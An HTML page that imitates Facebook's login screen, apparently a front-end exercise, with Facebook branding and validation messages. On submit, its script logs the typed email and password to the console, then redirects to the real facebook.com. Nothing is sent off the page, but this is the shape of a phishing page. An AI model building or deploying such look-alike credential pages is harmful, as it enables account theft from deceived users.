<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<style>
    * {
        box-sizing: border-box;
        margin: 0;
        padding: 0;
    }
    body {
        font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        display: flex;
        justify-content: center;
        align-items: center;
        min-height: 100vh;
        background-color: #f0f2f5;
    }
    .container {
        width: 90%;
        max-width: 400px;
        padding: 20px;
        background-color: white;
        border: 2px solid silver;
        border-radius: 10px;
        box-shadow: 2px 2px 7px 6px rgb(194, 192, 192);
        text-align: center;
    }
    .logo {
        width: 150px;
        margin: 0 auto 20px;
    }
    .para {
        margin-bottom: 20px;
        font-size: 1.2em;
    }
    input {
        width: calc(100% - 26px);
        padding: 13px;
        margin: 12px 0;
        border-radius: 5px;
        border: 1px solid silver;
    }
    .login {
        font-size: 18px;
        font-weight: bold;
        color: white;
        background-color: #1877F2;
        border: 1px solid silver;
        cursor: pointer;
    }
    a {
        text-decoration: none;
        color: #1877F2;
        display: block;
        margin-top: 10px;
    }
    .error {
        color: red;
        font-size: 0.9em;
    }

    @media (min-width: 600px) {
        .container {
            max-width: 500px;
            padding: 30px;
        }
        .logo {
            width: 200px;
        }
    }
</style>
<body>
    <div class="container">
        <img src="../IMAGE/Facebook-removebg-preview.png" alt="Facebook Logo" class="logo">
        <div>
        <h3 class="para">Log in to Facebook</h3>
        <form id="form" autocomplete="off">
            <input type="text" id="user" placeholder="Email address or Mobile number"><br>
            <span id="userError" class="error"></span>
            <input type="password" id="pwd" placeholder="Password"><br>
            <span id="pwdError" class="error"></span>
            <input class="login" type="submit" value="Log in">
            <a href="https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0">Forgotten account? - Sign up for Facebook</a>
        </form>
         </div>
    </div>

    <script>
        let form = document.getElementById("form");
        let user = document.getElementById("user");
        let userError = document.getElementById("userError");
        let password = document.getElementById("pwd");
        let pwdError = document.getElementById("pwdError");

        form.addEventListener('submit', function(e) {
            e.preventDefault();

            user.style.border = '';
            password.style.border = '';
            userError.textContent = '';
            pwdError.textContent = '';

            if (user.value == '') {
                user.style.border = '1px solid red';
                userError.textContent = "The email address or mobile number you've entered isn't connected to an account. Find your account and login.";
            } else if (password.value == '') {
                password.style.border = '1px solid red';
                pwdError.textContent = "The password that you've entered is incorrect. Forgotten password?";
            } else {
                console.log("Name:" + user.value);
                console.log("Password:" + password.value);
                form.reset();
                window.location.href = "https://www.facebook.com";
            }
        });
    </script>
    
</body>
</html>
